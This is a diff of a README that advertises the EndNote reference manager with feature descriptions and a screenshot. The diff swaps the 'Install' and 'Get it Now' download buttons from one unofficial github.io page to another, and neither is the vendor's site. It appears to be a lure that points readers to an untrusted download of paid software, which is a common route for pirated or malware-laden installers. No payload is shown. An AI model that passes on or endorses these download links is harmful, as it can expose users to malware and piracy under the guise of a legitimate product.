@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/endNote)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/endNote)
 
 </div>
 
@@ -27,7 +27,7 @@ The <a href="#endNote">reference collection from databases</a> imports reference
 The <a href="#endNote">Cite While You Write integration</a> with Microsoft Word inserts in-text citations while writing — placing the cursor in the text, triggering the citation insertion tool, searching the reference library, and selecting the reference inserts a correctly formatted citation at the cursor position. When the bibliography generates, Word automatically formats all cited references in the selected citation style — a complete, correctly formatted reference list produced automatically rather than manually compiled. The <a href="#endNote">7000-plus citation style library</a> covers the citation formats for virtually every academic journal and style guide — APA, MLA, Chicago, Harvard, Vancouver, and thousands of journal-specific styles that each publication requires for manuscript submission.
 
 <p align="center">
-  <img src="https://static.macupdate.com/screenshots/329559/m/endnote-screenshot.png?v=1658341361" alt="EndNote screenshot"/>
+  <img src="https://support.clarivate.com/Endnote/servlet/rtaImage?eid=ka14N000000MuWW&feoid=00N4100000e9NrK&refid=0EM4N000004rSEc" alt="EndNote screenshot"/>
 </p>
 
 <a href="#endNote">PDF management and annotation</a> attaches full-text PDFs to references — reading, highlighting, and annotating PDFs directly in EndNote alongside the reference metadata, with PDF search finding text across the complete attached PDF library. <a href="#endNote">Reference sharing and collaboration</a> shares reference libraries with research team members — collaborative reference management for research groups where multiple team members add and use the shared library.
@@ -81,7 +81,7 @@ EndNote's Cite While You Write integration is the feature that transforms refere
 
 <p align="center">
 
-[![Get it Now EndNote](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/endNote)
+[![Get it Now EndNote](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/endNote)
 
 </p>
 
